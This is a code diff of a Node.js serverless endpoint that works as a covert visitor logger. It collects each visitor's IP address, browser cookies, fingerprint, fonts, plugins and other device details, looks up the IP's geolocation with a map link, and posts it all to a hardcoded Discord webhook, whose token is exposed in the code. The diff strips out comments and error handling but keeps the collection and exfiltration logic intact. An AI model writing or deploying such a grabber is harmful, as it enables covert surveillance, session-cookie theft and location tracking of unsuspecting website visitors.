@@ -1,32 +1,22 @@
 const axios = require('axios');
 
 module.exports = async (req, res) => {
-    // 1. Allow CORS for testing (optional)
-    res.setHeader('Access-Control-Allow-Origin', '*');
-
-    // 2. Only POST
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    // 3. Wrap everything in try/catch to avoid crashes
     try {
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
         const clientData = req.body || {};
 
-        // 4. Get geolocation (with fallback)
+        // Geo lookup
         let geo = {};
         try {
             const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone`, { timeout: 3000 });
-            if (geoRes.data.status === 'success') {
-                geo = geoRes.data;
-            }
-        } catch (geoErr) {
-            console.error('Geo lookup failed:', geoErr.message);
-            // Continue without geo
-        }
+            if (geoRes.data.status === 'success') geo = geoRes.data;
+        } catch (e) {}
 
-        // 5. Build Discord embed
+        // Build embed
         const embed = {
             title: '🎯 New Visitor',
             color: 0xff0044,
@@ -38,9 +28,9 @@ module.exports = async (req, res) => {
                 { name: 'Platform', value: clientData.platform || 'Unknown', inline: true },
                 { name: 'Language', value: clientData.language || 'Unknown', inline: true },
                 { name: 'Timezone', value: clientData.timezone || 'Unknown', inline: true },
-                { name: 'Memory (GB)', value: clientData.memory || 'Unknown', inline: true },
+                { name: 'Memory', value: clientData.memory || 'Unknown', inline: true },
                 { name: 'Battery', value: clientData.battery || 'Unknown', inline: true },
-                { name: 'Site Cookies', value: (clientData.site_cookies || 'none').substring(0, 200), inline: false },
+                { name: 'Cookies', value: (clientData.cookies || 'none').substring(0, 200), inline: false },
                 { name: 'Plugins', value: (clientData.plugins || 'none').substring(0, 200), inline: false },
                 { name: 'Fonts', value: (clientData.fonts || 'none').substring(0, 200), inline: false },
                 { name: 'Fingerprint', value: (clientData.fingerprint || 'none').substring(0, 200), inline: false },
@@ -52,36 +42,17 @@ module.exports = async (req, res) => {
 
         if (geo.country) {
             embed.fields.push({ name: '📍 Location', value: `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip})`, inline: false });
-            if (geo.lat && geo.lon) {
-                embed.fields.push({ name: '🗺️ Map', value: `https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}&zoom=15`, inline: false });
-            }
+            if (geo.lat && geo.lon) embed.fields.push({ name: '🗺️ Map', value: `https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}&zoom=15`, inline: false });
             if (geo.isp) embed.fields.push({ name: 'ISP', value: geo.isp, inline: true });
             if (geo.org) embed.fields.push({ name: 'Organization', value: geo.org, inline: true });
         }
 
-        // 6. Send to Discord – this might fail, but we catch it
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
-        let webhookStatus = 'ok';
-        try {
-            await axios.post(WEBHOOK_URL, { embeds: [embed] });
-            console.log(`[+] Data from ${ip} sent to Discord.`);
-        } catch (webhookErr) {
-            console.error('Webhook error:', webhookErr.message);
-            webhookStatus = 'failed';
-        }
+        await axios.post(WEBHOOK_URL, { embeds: [embed] });
 
-        // 7. Always return a 200 (even if webhook failed) to avoid client errors
-        res.status(200).json({
-            status: webhookStatus,
-            message: webhookStatus === 'ok' ? 'Data forwarded to Discord' : 'Webhook delivery failed (see logs)',
-        });
-
+        res.status(200).json({ status: 'ok' });
     } catch (err) {
-        // 8. Catch any unexpected errors and return a 500 with details
-        console.error('Unhandled error in /api/collect:', err);
-        res.status(500).json({
-            error: 'Internal server error',
-            details: err.message,
-        });
+        console.error(err);
+        res.status(500).json({ error: 'Internal error' });
     }
 };
